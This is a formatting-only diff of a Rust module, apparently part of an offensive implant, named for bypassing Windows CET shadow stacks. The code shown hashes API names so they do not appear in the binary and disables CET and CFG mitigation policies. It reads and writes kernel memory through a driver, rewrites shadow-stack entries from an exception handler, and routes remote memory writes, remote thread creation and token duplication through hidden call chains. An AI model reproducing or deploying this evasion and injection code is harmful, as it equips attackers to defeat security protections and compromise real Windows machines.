@@ -112,9 +112,17 @@ const fn const_hash_wstr(units: &[u16]) -> u32 {
             break;
         }
         let lo = c as u8;
-        let lo = if lo >= b'A' && lo <= b'Z' { lo + 32 } else { lo };
+        let lo = if lo >= b'A' && lo <= b'Z' {
+            lo + 32
+        } else {
+            lo
+        };
         let hi = (c >> 8) as u8;
-        let hi = if hi >= b'A' && hi <= b'Z' { hi + 32 } else { hi };
+        let hi = if hi >= b'A' && hi <= b'Z' {
+            hi + 32
+        } else {
+            hi
+        };
         hash = hash.rotate_right(13) ^ (lo as u32);
         hash = hash.rotate_right(13) ^ (hi as u32);
         i += 1;
@@ -146,7 +154,7 @@ struct ExceptionRecord {
 #[cfg(feature = "kernel-callback")]
 #[repr(C)]
 struct Context {
-    _pad: [u8; 0x98],         // offset 0x00 – 0x97: P1Home..Rbp
+    _pad: [u8; 0x98],          // offset 0x00 – 0x97: P1Home..Rbp
     Rsp: u64,                  // offset 0x98
     _pad2: [u8; 0xF80 - 0xA0], // offset 0xA0 – 0xF7F: Rsi..FltSave
     Rip: u64,                  // offset 0xF80
@@ -163,7 +171,9 @@ struct ExceptionPointers {
 
 // Static assertions for VEH types.
 #[cfg(feature = "kernel-callback")]
-const _: () = assert!(std::mem::size_of::<ExceptionRecord>() >= 4 + 4 + 8 + 8 + 4 + 8 * EXCEPTION_MAXIMUM_PARAMETERS);
+const _: () = assert!(
+    std::mem::size_of::<ExceptionRecord>() >= 4 + 4 + 8 + 8 + 4 + 8 * EXCEPTION_MAXIMUM_PARAMETERS
+);
 #[cfg(feature = "kernel-callback")]
 const _: () = assert!(std::mem::offset_of!(Context, Rsp) == 0x98);
 #[cfg(feature = "kernel-callback")]
@@ -187,16 +197,15 @@ const STATUS_ACCESS_DENIED: i32 = 0xC0000022_u32 as i32;
 
 /// Dynamically resolve and call `GetLastError` via pe_resolve (no IAT entry).
 fn dynamic_get_last_error() -> u32 {
-    let kernel32 = match unsafe { pe_resolve::get_module_handle_by_hash(
-        pe_resolve::hash_str(b"kernel32.dll\0")
-    ) } {
+    let kernel32 = match unsafe {
+        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
+    } {
         Some(b) => b,
         None => return 0,
     };
-    let fn_addr = match unsafe { pe_resolve::get_proc_address_by_hash(
-        kernel32,
-        pe_resolve::hash_str(b"GetLastError\0")
-    ) } {
+    let fn_addr = match unsafe {
+        pe_resolve::get_proc_address_by_hash(kernel32, pe_resolve::hash_str(b"GetLastError\0"))
+    } {
         Some(a) => a,
         None => return 0,
     };
@@ -291,7 +300,9 @@ pub fn init_from_config(config: &common::config::CetBypassConfig) {
             log::info!("cet_bypass: CET disabled for agent process via mitigation policy");
             CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
         } else {
-            log::warn!("cet_bypass: failed to disable CET for agent process (policy disable failed)");
+            log::warn!(
+                "cet_bypass: failed to disable CET for agent process (policy disable failed)"
+            );
         }
     }
 
@@ -350,13 +361,19 @@ pub fn prepare_spoofing(target_handle: Option<HANDLE>) -> CetAction {
             if PREFER_POLICY_DISABLE.load(Ordering::SeqCst) {
                 let handle = target_handle.unwrap_or_else(|| (-1isize) as *mut _);
                 if disable_cet_for_process(handle) {
-                    log::debug!("cet_bypass: CET disabled for target process via mitigation policy");
+                    log::debug!(
+                        "cet_bypass: CET disabled for target process via mitigation policy"
+                    );
                     CetAction::Disabled
                 } else if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
-                    log::debug!("cet_bypass: policy disable failed, falling back to call-chain approach");
+                    log::debug!(
+                        "cet_bypass: policy disable failed, falling back to call-chain approach"
+                    );
                     CetAction::UseCallChain
                 } else {
-                    log::warn!("cet_bypass: CET policy disable failed and call-chain fallback is disabled");
+                    log::warn!(
+                        "cet_bypass: CET policy disable failed and call-chain fallback is disabled"
+                    );
                     CetAction::Abort
                 }
             } else if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
@@ -369,7 +386,9 @@ pub fn prepare_spoofing(target_handle: Option<HANDLE>) -> CetAction {
             if FALLBACK_TO_CALL_CHAIN.load(Ordering::SeqCst) {
                 CetAction::UseCallChain
             } else {
-                log::warn!("cet_bypass: CET cannot be disabled and call-chain fallback is disabled");
+                log::warn!(
+                    "cet_bypass: CET cannot be disabled and call-chain fallback is disabled"
+                );
                 CetAction::Abort
             }
         }
@@ -427,7 +446,10 @@ fn detect_cet_state() {
     // CET shadow stacks are only hardware-enforced on Win 11 24H2+.
     // Earlier builds may have software CET but it is not enforced.
     if build < 26100 {
-        log::info!("cet_bypass: build {} < 26100, CET not hardware-enforced", build);
+        log::info!(
+            "cet_bypass: build {} < 26100, CET not hardware-enforced",
+            build
+        );
         CET_STATE.store(CET_DISABLED, Ordering::SeqCst);
         return;
     }
@@ -437,16 +459,17 @@ fn detect_cet_state() {
     let mut cfg_policy = ProcessMitigationControlFlowGuardPolicy { Flags: 0 };
 
     // Resolve GetProcessMitigationPolicy dynamically to avoid IAT entry.
-    type FnGetProcessMitigationPolicy = unsafe extern "system" fn(
-        HANDLE, ProcessMitigationPolicy, PVOID, SIZE_T,
-    ) -> BOOL;
+    type FnGetProcessMitigationPolicy =
+        unsafe extern "system" fn(HANDLE, ProcessMitigationPolicy, PVOID, SIZE_T) -> BOOL;
     let get_policy_fn: Option<FnGetProcessMitigationPolicy> = {
-        let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) };
+        let kernel32 =
+            unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) };
         match kernel32 {
             Some(base) => {
                 let hash = pe_resolve::hash_str(b"GetProcessMitigationPolicy\0");
-                unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
-                    .map(|addr| unsafe { std::mem::transmute::<usize, FnGetProcessMitigationPolicy>(addr) })
+                unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }.map(|addr| unsafe {
+                    std::mem::transmute::<usize, FnGetProcessMitigationPolicy>(addr)
+                })
             }
             None => None,
         }
@@ -491,7 +514,10 @@ fn detect_cet_state() {
 
     // CFG is enabled.  On Win11 24H2+, CET shadow stacks are active.
     // Try to disable via policy to determine if we CAN disable.
-    log::info!("cet_bypass: CFG enabled on build {}, CET shadow stacks likely active", build);
+    log::info!(
+        "cet_bypass: CFG enabled on build {}, CET shadow stacks likely active",
+        build
+    );
 
     // Try a test disable: attempt to set CET policy.  If it succeeds,
     // we're in state 1 (can disable).  If access denied, state 2.
@@ -516,26 +542,21 @@ fn can_disable_cet_policy() -> bool {
     let mut current = ProcessMitigationControlFlowGuardPolicy { Flags: 0 };
 
     // Resolve APIs dynamically.
-    type FnGetPolicy = unsafe extern "system" fn(
-        HANDLE, ProcessMitigationPolicy, PVOID, SIZE_T,
-    ) -> BOOL;
-    type FnSetPolicy = unsafe extern "system" fn(
-        ProcessMitigationPolicy, PVOID, SIZE_T,
-    ) -> BOOL;
+    type FnGetPolicy =
+        unsafe extern "system" fn(HANDLE, ProcessMitigationPolicy, PVOID, SIZE_T) -> BOOL;
+    type FnSetPolicy = unsafe extern "system" fn(ProcessMitigationPolicy, PVOID, SIZE_T) -> BOOL;
 
     let kernel32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) };
-    let get_fn: Option<FnGetPolicy> = kernel32
-        .and_then(|base| {
-            let hash = pe_resolve::hash_str(b"GetProcessMitigationPolicy\0");
-            unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
-                .map(|addr| unsafe { std::mem::transmute::<usize, FnGetPolicy>(addr) })
-        });
-    let set_fn: Option<FnSetPolicy> = kernel32
-        .and_then(|base| {
-            let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
-            unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
-                .map(|addr| unsafe { std::mem::transmute::<usize, FnSetPolicy>(addr) })
-        });
+    let get_fn: Option<FnGetPolicy> = kernel32.and_then(|base| {
+        let hash = pe_resolve::hash_str(b"GetProcessMitigationPolicy\0");
+        unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
+            .map(|addr| unsafe { std::mem::transmute::<usize, FnGetPolicy>(addr) })
+    });
+    let set_fn: Option<FnSetPolicy> = kernel32.and_then(|base| {
+        let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
+        unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
+            .map(|addr| unsafe { std::mem::transmute::<usize, FnSetPolicy>(addr) })
+    });
 
     let get_fn = match get_fn {
         Some(f) => f,
@@ -577,7 +598,10 @@ fn can_disable_cet_policy() -> bool {
             return false;
         }
         // Other errors might be transient — assume we can try.
-        log::debug!("cet_bypass: SetProcessMitigationPolicy returned error {}, assuming can-disable", err);
+        log::debug!(
+            "cet_bypass: SetProcessMitigationPolicy returned error {}, assuming can-disable",
+            err
+        );
     }
 
     true
@@ -609,16 +633,16 @@ fn disable_cet_for_process(handle: HANDLE) -> bool {
 
     if is_self {
         // Dynamically resolve SetProcessMitigationPolicy to avoid IAT entry.
-        type FnSetPolicy = unsafe extern "system" fn(
-            ProcessMitigationPolicy, PVOID, SIZE_T,
-        ) -> BOOL;
+        type FnSetPolicy =
+            unsafe extern "system" fn(ProcessMitigationPolicy, PVOID, SIZE_T) -> BOOL;
 
-        let set_fn: Option<FnSetPolicy> = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
-            .and_then(|base| {
-                let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
-                unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
-                    .map(|addr| unsafe { std::mem::transmute::<usize, FnSetPolicy>(addr) })
-            });
+        let set_fn: Option<FnSetPolicy> =
+            unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
+                .and_then(|base| {
+                    let hash = pe_resolve::hash_str(b"SetProcessMitigationPolicy\0");
+                    unsafe { pe_resolve::get_proc_address_by_hash(base, hash) }
+                        .map(|addr| unsafe { std::mem::transmute::<usize, FnSetPolicy>(addr) })
+                });
 
         let set_fn = match set_fn {
             Some(f) => f,
@@ -756,14 +780,32 @@ pub struct CallChainStep {
 // ─── Pre-computed DLL wide-string hashes ────────────────────────────────────
 
 const KERNEL32_DLL_HASH: u32 = const_hash_wstr(&[
-    b'k' as u16, b'e' as u16, b'r' as u16, b'n' as u16,
-    b'e' as u16, b'l' as u16, b'3' as u16, b'2' as u16,
-    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+    b'k' as u16,
+    b'e' as u16,
+    b'r' as u16,
+    b'n' as u16,
+    b'e' as u16,
+    b'l' as u16,
+    b'3' as u16,
+    b'2' as u16,
+    b'.' as u16,
+    b'd' as u16,
+    b'l' as u16,
+    b'l' as u16,
 ]);
 const ADVAPI32_DLL_HASH: u32 = const_hash_wstr(&[
-    b'a' as u16, b'd' as u16, b'v' as u16, b'a' as u16,
-    b'p' as u16, b'i' as u16, b'3' as u16, b'2' as u16,
-    b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16,
+    b'a' as u16,
+    b'd' as u16,
+    b'v' as u16,
+    b'a' as u16,
+    b'p' as u16,
+    b'i' as u16,
+    b'3' as u16,
+    b'2' as u16,
+    b'.' as u16,
+    b'd' as u16,
+    b'l' as u16,
+    b'l' as u16,
 ]);
 
 // ─── Pre-computed function name hashes ──────────────────────────────────────
@@ -788,102 +830,103 @@ const HASH_DUPLICATETOKENEX: u32 = const_hash_str(b"DuplicateTokenEx");
 /// Each `CallChainStep` stores pre-computed DLL/function hashes (matching
 /// the pe_resolve SEED) rather than plaintext strings, so no DLL or API
 /// names appear in the binary's static data.
-pub static CALL_CHAINS: once_cell::sync::Lazy<std::collections::HashMap<&'static str, Vec<CallChainStep>>> =
-    once_cell::sync::Lazy::new(|| {
-        let mut m = std::collections::HashMap::new();
+pub static CALL_CHAINS: once_cell::sync::Lazy<
+    std::collections::HashMap<&'static str, Vec<CallChainStep>>,
+> = once_cell::sync::Lazy::new(|| {
+    let mut m = std::collections::HashMap::new();
 
-        m.insert(
-            "NtWriteVirtualMemory",
-            vec![CallChainStep {
-                dll_hash: KERNEL32_DLL_HASH,
-                func_hash: HASH_WRITEPROCESSMEMORY,
-                arg_count: 5,
-            }],
-        );
+    m.insert(
+        "NtWriteVirtualMemory",
+        vec![CallChainStep {
+            dll_hash: KERNEL32_DLL_HASH,
+            func_hash: HASH_WRITEPROCESSMEMORY,
+            arg_count: 5,
+        }],
+    );
 
-        m.insert(
-            "NtReadVirtualMemory",
-            vec![CallChainStep {
-                dll_hash: KERNEL32_DLL_HASH,
-                func_hash: HASH_READPROCESSMEMORY,
-                arg_count: 5,
-            }],
-        );
+    m.insert(
+        "NtReadVirtualMemory",
+        vec![CallChainStep {
+            dll_hash: KERNEL32_DLL_HASH,
+            func_hash: HASH_READPROCESSMEMORY,
+            arg_count: 5,
+        }],
+    );
 
-        m.insert(
-            "NtAllocateVirtualMemory",
-            vec![CallChainStep {
-                dll_hash: KERNEL32_DLL_HASH,
-                func_hash: HASH_VIRTUALALLOCEX,
-                arg_count: 5,
-            }],
-        );
+    m.insert(
+        "NtAllocateVirtualMemory",
+        vec![CallChainStep {
+            dll_hash: KERNEL32_DLL_HASH,
+            func_hash: HASH_VIRTUALALLOCEX,
+            arg_count: 5,
+        }],
+    );
 
-        m.insert(
-            "NtFreeVirtualMemory",
-            vec![CallChainStep {
-                dll_hash: KERNEL32_DLL_HASH,
-                func_hash: HASH_VIRTUALFREEEX,
-                arg_count: 4,
-            }],
-        );
+    m.insert(
+        "NtFreeVirtualMemory",
+        vec![CallChainStep {
+            dll_hash: KERNEL32_DLL_HASH,
+            func_hash: HASH_VIRTUALFREEEX,
+            arg_count: 4,
+        }],
+    );
 
-        m.insert(
-            "NtProtectVirtualMemory",
-            vec![CallChainStep {
-                dll_hash: KERNEL32_DLL_HASH,
-                func_hash: HASH_VIRTUALPROTECTEX,
-                arg_count: 5,
-            }],
-        );
+    m.insert(
+        "NtProtectVirtualMemory",
+        vec![CallChainStep {
+            dll_hash: KERNEL32_DLL_HASH,
+            func_hash: HASH_VIRTUALPROTECTEX,
+            arg_count: 5,
+        }],
+    );
 
-        m.insert(
-            "NtOpenProcess",
-            vec![CallChainStep {
-                dll_hash: KERNEL32_DLL_HASH,
-                func_hash: HASH_OPENPROCESS,
-                arg_count: 3,
-            }],
-        );
+    m.insert(
+        "NtOpenProcess",
+        vec![CallChainStep {
+            dll_hash: KERNEL32_DLL_HASH,
+            func_hash: HASH_OPENPROCESS,
+            arg_count: 3,
+        }],
+    );
 
-        m.insert(
-            "NtClose",
-            vec![CallChainStep {
-                dll_hash: KERNEL32_DLL_HASH,
-                func_hash: HASH_CLOSEHANDLE,
-                arg_count: 1,
-            }],
-        );
+    m.insert(
+        "NtClose",
+        vec![CallChainStep {
+            dll_hash: KERNEL32_DLL_HASH,
+            func_hash: HASH_CLOSEHANDLE,
+            arg_count: 1,
+        }],
+    );
 
-        m.insert(
-            "NtQueryVirtualMemory",
-            vec![CallChainStep {
-                dll_hash: KERNEL32_DLL_HASH,
-                func_hash: HASH_VIRTUALQUERYEX,
-                arg_count: 4,
-            }],
-        );
+    m.insert(
+        "NtQueryVirtualMemory",
+        vec![CallChainStep {
+            dll_hash: KERNEL32_DLL_HASH,
+            func_hash: HASH_VIRTUALQUERYEX,
+            arg_count: 4,
+        }],
+    );
 
-        m.insert(
-            "NtCreateThreadEx",
-            vec![CallChainStep {
-                dll_hash: KERNEL32_DLL_HASH,
-                func_hash: HASH_CREATEREMOTETHREADEX,
-                arg_count: 6,
-            }],
-        );
+    m.insert(
+        "NtCreateThreadEx",
+        vec![CallChainStep {
+            dll_hash: KERNEL32_DLL_HASH,
+            func_hash: HASH_CREATEREMOTETHREADEX,
+            arg_count: 6,
+        }],
+    );
 
-        m.insert(
-            "NtDuplicateToken",
-            vec![CallChainStep {
-                dll_hash: ADVAPI32_DLL_HASH,
-                func_hash: HASH_DUPLICATETOKENEX,
-                arg_count: 5,
-            }],
-        );
+    m.insert(
+        "NtDuplicateToken",
+        vec![CallChainStep {
+            dll_hash: ADVAPI32_DLL_HASH,
+            func_hash: HASH_DUPLICATETOKENEX,
+            arg_count: 5,
+        }],
+    );
 
-        m
-    });
+    m
+});
 
 /// Execute a CET-compatible call using the kernel32 equivalent of an NT API.
 ///
@@ -903,7 +946,10 @@ pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
     let chain = CALL_CHAINS.get(func_name)?;
 
     if chain.len() != 1 {
-        log::warn!("cet_bypass: multi-step call chains not yet supported for {}", func_name);
+        log::warn!(
+            "cet_bypass: multi-step call chains not yet supported for {}",
+            func_name
+        );
         return None;
     }
 
@@ -922,7 +968,8 @@ pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
         }
     };
 
-    let func_addr = match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, step.func_hash) } {
+    let func_addr = match unsafe { pe_resolve::get_proc_address_by_hash(dll_base, step.func_hash) }
+    {
         Some(a) => a,
         None => {
             log::warn!(
@@ -950,8 +997,7 @@ pub fn call_via_chain(func_name: &str, args: &[u64]) -> Option<i32> {
     let result = unsafe {
         match step.arg_count {
             1 => {
-                let func: unsafe extern "system" fn(u64) -> i32 =
-                    std::mem::transmute(func_addr);
+                let func: unsafe extern "system" fn(u64) -> i32 = std::mem::transmute(func_addr);
                 func(args.get(0).copied().unwrap_or(0))
             }
             2 => {
@@ -1106,9 +1152,7 @@ fn get_kernel_base() -> Option<u64> {
             0,
             &mut buf_size as *mut u32
         ) {
-            log::warn!(
-                "cet_bypass: NtQuerySystemInformation (size query) resolution failed: {e}"
-            );
+            log::warn!("cet_bypass: NtQuerySystemInformation (size query) resolution failed: {e}");
             return None;
         }
     }
@@ -1130,14 +1174,15 @@ fn get_kernel_base() -> Option<u64> {
     } {
         Ok(status) => status,
         Err(e) => {
-            log::warn!(
-                "cet_bypass: NtQuerySystemInformation resolution failed: {e}"
-            );
+            log::warn!("cet_bypass: NtQuerySystemInformation resolution failed: {e}");
             return None;
         }
     };
     if status < 0 {
-        log::warn!("cet_bypass: NtQuerySystemInformation failed: 0x{:08X}", status as u32);
+        log::warn!(
+            "cet_bypass: NtQuerySystemInformation failed: 0x{:08X}",
+            status as u32
+        );
         return None;
     }
 
@@ -1178,11 +1223,23 @@ fn kernel_read_u64(
         // Translate VA→PA via page-table walk.
         let phys = kernel_translate_va_to_pa(driver, device_handle, cr3, kernel_addr)?;
         unsafe {
-            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, phys, &mut buf).ok()?
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                phys,
+                &mut buf,
+            )
+            .ok()?
         }
     } else {
         unsafe {
-            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, kernel_addr, &mut buf).ok()?
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                kernel_addr,
+                &mut buf,
+            )
+            .ok()?
         }
     }
     Some(u64::from_le_bytes(buf))
@@ -1206,11 +1263,23 @@ fn kernel_write_u64(
             None => return false,
         };
         unsafe {
-            crate::kernel_callback::deploy::write_physical_memory(driver, device_handle, phys, &data).is_ok()
+            crate::kernel_callback::deploy::write_physical_memory(
+                driver,
+                device_handle,
+                phys,
+                &data,
+            )
+            .is_ok()
         }
     } else {
         unsafe {
-            crate::kernel_callback::deploy::write_physical_memory(driver, device_handle, kernel_addr, &data).is_ok()
+            crate::kernel_callback::deploy::write_physical_memory(
+                driver,
+                device_handle,
+                kernel_addr,
+                &data,
+            )
+            .is_ok()
         }
     }
 }
@@ -1241,7 +1310,13 @@ fn kernel_translate_va_to_pa(
     let read_entry = |phys_addr: u64, idx: u64| -> Option<u64> {
         let mut buf = [0u8; 8];
         unsafe {
-            crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, phys_addr + idx * 8, &mut buf).ok()?
+            crate::kernel_callback::deploy::read_physical_memory(
+                driver,
+                device_handle,
+                phys_addr + idx * 8,
+                &mut buf,
+            )
+            .ok()?
         }
         Some(u64::from_le_bytes(buf))
     };
@@ -1250,7 +1325,10 @@ fn kernel_translate_va_to_pa(
     let pml4_base = cr3 & PFN_MASK;
     let pml4e = read_entry(pml4_base, pml4_idx)?;
     if pml4e & PTE_PRESENT == 0 {
-        log::debug!("cet_bypass: PML4E not present for VA 0x{:016X}", virtual_address);
+        log::debug!(
+            "cet_bypass: PML4E not present for VA 0x{:016X}",
+            virtual_address
+        );
         return None;
     }
 
@@ -1258,7 +1336,10 @@ fn kernel_translate_va_to_pa(
     let pdpt_base = pml4e & PFN_MASK;
     let pdpte = read_entry(pdpt_base, pdpt_idx)?;
     if pdpte & PTE_PRESENT == 0 {
-        log::debug!("cet_bypass: PDPTE not present for VA 0x{:016X}", virtual_address);
+        log::debug!(
+            "cet_bypass: PDPTE not present for VA 0x{:016X}",
+            virtual_address
+        );
         return None;
     }
     // 1 GB large page
@@ -1270,7 +1351,10 @@ fn kernel_translate_va_to_pa(
     let pd_base = pdpte & PFN_MASK;
     let pde = read_entry(pd_base, pd_idx)?;
     if pde & PTE_PRESENT == 0 {
-        log::debug!("cet_bypass: PDE not present for VA 0x{:016X}", virtual_address);
+        log::debug!(
+            "cet_bypass: PDE not present for VA 0x{:016X}",
+            virtual_address
+        );
         return None;
     }
     // 2 MB large page
@@ -1282,7 +1366,10 @@ fn kernel_translate_va_to_pa(
     let pt_base = pde & PFN_MASK;
     let pte = read_entry(pt_base, pt_idx)?;
     if pte & PTE_PRESENT == 0 {
-        log::debug!("cet_bypass: PTE not present for VA 0x{:016X}", virtual_address);
+        log::debug!(
+            "cet_bypass: PTE not present for VA 0x{:016X}",
+            virtual_address
+        );
         return None;
     }
 
@@ -1311,8 +1398,13 @@ fn resolve_cr3(
     // (most drivers handle kernel VAs via MmMapIoSpace internally).
     let mut ptr_buf = [0u8; 8];
     unsafe {
-        crate::kernel_callback::deploy::read_physical_memory(driver, device_handle, eprocess_ptr_addr, &mut ptr_buf)
-            .ok()?;
+        crate::kernel_callback::deploy::read_physical_memory(
+            driver,
+            device_handle,
+            eprocess_ptr_addr,
+            &mut ptr_buf,
+        )
+        .ok()?;
     }
     let eprocess_addr = u64::from_le_bytes(ptr_buf);
     if eprocess_addr == 0 {
@@ -1356,7 +1448,8 @@ fn resolve_current_kthread(
 ) -> Option<u64> {
     // Get current processor number from user mode.
     let cpu_num: u32 = unsafe {
-        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))?;
+        let kernel32 =
+            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))?;
         let fn_addr = pe_resolve::get_proc_address_by_hash(
             kernel32,
             pe_resolve::hash_str(b"GetCurrentProcessorNumber\0"),
@@ -1391,7 +1484,9 @@ fn resolve_current_kthread(
 
     log::debug!(
         "cet_bypass: resolved KTHREAD 0x{:016X} via KiProcessorBlock[{}] (KPCR 0x{:016X})",
-        kthread, cpu_num, kpcr_ptr
+        kthread,
+        cpu_num,
+        kpcr_ptr
     );
     Some(kthread)
 }
@@ -1409,9 +1504,7 @@ fn resolve_current_kthread(
 /// If any step fails or the build is not in the offset table, returns
 /// EXCEPTION_CONTINUE_SEARCH (which will crash — safer than corrupting memory).
 #[cfg(feature = "kernel-callback")]
-unsafe extern "system" fn veh_shadow_stack_handler(
-    exception_info: *mut ExceptionPointers,
-) -> i32 {
+unsafe extern "system" fn veh_shadow_stack_handler(exception_info: *mut ExceptionPointers) -> i32 {
     let ep = match exception_info.as_ref() {
         Some(p) => p,
         None => return EXCEPTION_CONTINUE_SEARCH,
@@ -1497,18 +1590,14 @@ unsafe extern "system" fn veh_shadow_stack_handler(
     };
 
     // Step 5: Read the shadow-stack pointer from KTHREAD.
-    let shadow_stack_ptr = match kernel_read_u64(
-        driver,
-        device_handle,
-        cr3,
-        kthread + ss_offset as u64,
-    ) {
-        Some(p) => p,
-        None => {
-            log::error!("cet_bypass: failed to read shadow-stack pointer from KTHREAD");
-            return EXCEPTION_CONTINUE_SEARCH;
-        }
-    };
+    let shadow_stack_ptr =
+        match kernel_read_u64(driver, device_handle, cr3, kthread + ss_offset as u64) {
+            Some(p) => p,
+            None => {
+                log::error!("cet_bypass: failed to read shadow-stack pointer from KTHREAD");
+                return EXCEPTION_CONTINUE_SEARCH;
+            }
+        };
 
     if shadow_stack_ptr == 0 {
         log::error!("cet_bypass: shadow-stack pointer is NULL");
@@ -1531,7 +1620,10 @@ unsafe extern "system" fn veh_shadow_stack_handler(
 
     log::debug!(
         "cet_bypass: SSP=0x{:016X}, RSP=0x{:016X}, expected ret=0x{:016X}, RIP=0x{:016X}",
-        shadow_stack_ptr, rsp, expected_return_addr, context.Rip
+        shadow_stack_ptr,
+        rsp,
+        expected_return_addr,
+        context.Rip
     );
 
     // Scan shadow stack entries (up to 32 entries back from current SSP).
@@ -1582,7 +1674,9 @@ unsafe extern "system" fn veh_shadow_stack_handler(
 #[cfg(feature = "kernel-callback")]
 fn install_veh_shadow_fix() {
     // Dynamically resolve AddVectoredExceptionHandler to avoid IAT entry.
-    let kernel32 = match unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) } {
+    let kernel32 = match unsafe {
+        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0"))
+    } {
         Some(b) => b,
         None => {
             log::error!("cet_bypass: failed to resolve kernel32 for AddVectoredExceptionHandler");
@@ -1590,10 +1684,12 @@ fn install_veh_shadow_fix() {
         }
     };
 
-    let fn_addr = match unsafe { pe_resolve::get_proc_address_by_hash(
-        kernel32,
-        pe_resolve::hash_str(b"AddVectoredExceptionHandler\0"),
-    ) } {
+    let fn_addr = match unsafe {
+        pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"AddVectoredExceptionHandler\0"),
+        )
+    } {
         Some(a) => a,
         None => {
             log::error!("cet_bypass: failed to resolve AddVectoredExceptionHandler");
@@ -1601,8 +1697,10 @@ fn install_veh_shadow_fix() {
         }
     };
 
-    type FnAddVectoredExceptionHandler =
-        unsafe extern "system" fn(u32, unsafe extern "system" fn(*mut ExceptionPointers) -> i32) -> *mut std::ffi::c_void;
+    type FnAddVectoredExceptionHandler = unsafe extern "system" fn(
+        u32,
+        unsafe extern "system" fn(*mut ExceptionPointers) -> i32,
+    ) -> *mut std::ffi::c_void;
 
     let add_veh: FnAddVectoredExceptionHandler = unsafe { std::mem::transmute(fn_addr) };
 
@@ -1655,7 +1753,10 @@ fn get_windows_build() -> u32 {
     // P2-16: Fallback using RtlGetVersion via pe_resolve if KUSER_SHARED_DATA
     // value looks invalid.  RtlGetVersion is guaranteed to return accurate
     // version info even when compatibility manifests lie to GetVersionEx.
-    log::debug!("cet_bypass: KUSER_SHARED_DATA build {} looks invalid, trying RtlGetVersion fallback", masked);
+    log::debug!(
+        "cet_bypass: KUSER_SHARED_DATA build {} looks invalid, trying RtlGetVersion fallback",
+        masked
+    );
 
     #[cfg(target_os = "windows")]
     {
@@ -1672,9 +1773,12 @@ fn get_windows_build() -> u32 {
         let ntdll_hash = pe_resolve::hash_wstr(&"ntdll.dll\0".encode_utf16().collect::<Vec<u16>>());
         if let Some(ntdll_base) = unsafe { pe_resolve::get_module_handle_by_hash(ntdll_hash) } {
             let fn_hash = pe_resolve::hash_str(b"RtlGetVersion\0");
-            if let Some(fn_addr) = unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash) } {
+            if let Some(fn_addr) =
+                unsafe { pe_resolve::get_proc_address_by_hash(ntdll_base, fn_hash) }
+            {
                 type FnRtlGetVersion = unsafe extern "system" fn(*mut OsVersionInfoExW) -> i32;
-                let rtl_get_version: FnRtlGetVersion = unsafe { std::mem::transmute::<usize, FnRtlGetVersion>(fn_addr) };
+                let rtl_get_version: FnRtlGetVersion =
+                    unsafe { std::mem::transmute::<usize, FnRtlGetVersion>(fn_addr) };
                 let mut version_info = OsVersionInfoExW {
                     dw_os_version_info_size: std::mem::size_of::<OsVersionInfoExW>() as u32,
                     dw_major_version: 0,
